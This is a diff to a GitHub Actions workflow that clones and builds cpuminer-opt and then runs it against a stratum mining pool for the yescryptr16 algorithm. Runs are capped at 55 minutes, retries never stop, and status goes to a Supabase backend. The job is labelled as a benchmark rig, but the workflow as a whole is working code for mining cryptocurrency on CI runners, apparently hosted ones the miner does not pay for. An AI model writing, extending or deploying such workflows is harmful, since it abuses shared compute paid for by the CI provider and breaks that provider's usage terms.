@@ -82,7 +82,7 @@ jobs:
         run: |
           sudo apt-get update -qq
           sudo apt-get install -y -qq \
-            build-essential automake autoconf pkg-config \
+            build-essential automake autoconf libtool pkg-config \
             libcurl4-openssl-dev libjansson-dev \
             libssl-dev libgmp-dev \
             libnuma-dev libhwloc-dev \
@@ -99,38 +99,31 @@ jobs:
           fi
           echo "[preflight] TCP reachable ✓"
 
-      - name: Build cpuminer
+      - name: Build cpuminer-opt
         id: build
         run: |
           ALGO="${ALGO:-yescryptr16}"
-          echo "[build] cloning cpuminer for algo=$ALGO"
-          git clone --depth=1 https://github.com/5mil/cpuminer-yescryptr16.git /tmp/cpuminer 2>&1 || {
-            echo "[error] BUILD_CLONE_FAIL: git clone failed — possible network issue or repo unavailable"
+          echo "[build] cloning cpuminer-opt (JayDDee) for algo=$ALGO"
+          git clone --depth=1 https://github.com/JayDDee/cpuminer-opt.git /tmp/cpuminer 2>&1 || {
+            echo "[error] BUILD_CLONE_FAIL: git clone failed"
             exit 1
           }
           cd /tmp/cpuminer
-
-          # Fix: yescrypt-platform.c is #included directly by both yescrypt-avx2.c
-          # and yescrypt-sse.c causing duplicate symbol errors on GCC 12+.
-          # Wrap it with a classic include-guard so the second inclusion is a no-op.
-          sed -i '1s/^/#ifndef YESCRYPT_PLATFORM_C\n#define YESCRYPT_PLATFORM_C\n/' yescrypt-platform.c
-          echo '#endif /* YESCRYPT_PLATFORM_C */' >> yescrypt-platform.c
-
-          ./autogen.sh 2>&1 || { echo "[error] BUILD_AUTOGEN_FAIL"; exit 1; }
-          ./configure \
-            CFLAGS="-O3 -march=native -mavx2 -maes -msse4.2 \
-                    -funroll-loops -fomit-frame-pointer \
-                    -falign-functions=16 -falign-loops=16 \
-                    -fno-strict-aliasing" \
-            --enable-assembly 2>&1 || { echo "[error] BUILD_CONFIGURE_FAIL"; exit 1; }
-          make -j$(nproc) 2>&1 || { echo "[error] BUILD_MAKE_FAIL"; exit 1; }
-          if [ ! -f ./minerd ]; then
-            echo "[error] BUILD_BINARY_MISSING: minerd not found after make"
+          ./build.sh 2>&1 || {
+            # build.sh may not exist on all versions, fall back to manual
+            echo "[build] build.sh failed or missing, trying manual configure"
+            ./autogen.sh 2>&1 || { echo "[error] BUILD_AUTOGEN_FAIL"; exit 1; }
+            ./configure CFLAGS="-O3 -march=native -funroll-loops -fomit-frame-pointer -fno-strict-aliasing" 2>&1 || { echo "[error] BUILD_CONFIGURE_FAIL"; exit 1; }
+            make -j$(nproc) 2>&1 || { echo "[error] BUILD_MAKE_FAIL"; exit 1; }
+          }
+          if [ ! -f ./cpuminer ]; then
+            echo "[error] BUILD_BINARY_MISSING: cpuminer not found after build"
             exit 1
           fi
-          strip -s minerd
-          echo "[build] cpuminer built: $(./minerd --version | head -1)"
-          echo "CPU flags: $(grep -m1 flags /proc/cpuinfo | grep -oE 'avx[^ ]*|sse[^ ]*' | tr '\n' ' ')"
+          strip -s cpuminer
+          echo "[build] cpuminer-opt built: $(./cpuminer --version | head -1)"
+          echo "[build] supported algos check:"
+          ./cpuminer --algo yescryptr16 --help 2>&1 | head -5 || true
 
       - name: Mine
         run: |
@@ -149,6 +142,7 @@ jobs:
           DURATION  = min(int(os.environ.get("DURATION_MIN", "30")), 55) * 60
           RIG       = os.environ.get("RIG_ID", "bench-rig-01")
           NPROC     = multiprocessing.cpu_count()
+          BINARY    = "/tmp/cpuminer/cpuminer"
 
           def patch(data, retries=3):
               if not SUPA_URL or not SUPA_KEY or not WID:
@@ -224,7 +218,7 @@ jobs:
               if m2: state["hashrate"] = to_hs(float(m2.group(1)), m2.group(2))
 
           cmd = [
-              "/tmp/cpuminer/minerd",
+              BINARY,
               "--algo",        ALGO,
               "--url",         f"stratum+tcp://{host}:{port}",
               "--user",        SUSER,
@@ -233,7 +227,6 @@ jobs:
               "--timeout",     "300",
               "--retries",     "-1",
               "--retry-pause", "10",
-              "--reconnect",
           ]
           print(f"[worker] launching {NPROC} threads: {' '.join(cmd)}", flush=True)
 
@@ -243,7 +236,7 @@ jobs:
                   text=True, bufsize=1
               )
           except FileNotFoundError:
-              msg = "BINARY_NOT_FOUND: /tmp/cpuminer/minerd — build step may have failed silently"
+              msg = f"BINARY_NOT_FOUND: {BINARY}"
               print(f"[error] {msg}", flush=True)
               patch({"status": "error", "last_error": msg})
               sys.exit(1)
@@ -292,7 +285,7 @@ jobs:
                       if stall_start is None:
                           stall_start = now
                       elif (now - stall_start) > STALL_LIMIT:
-                          msg = f"STALL_DETECTED: hashrate=0 for >{STALL_LIMIT}s — possible algo mismatch or pool not sending jobs"
+                          msg = f"STALL_DETECTED: hashrate=0 for >{STALL_LIMIT}s"
                           print(f"[error] {msg}", flush=True)
                           patch({"status": "error", "last_error": msg})
                           proc.terminate()
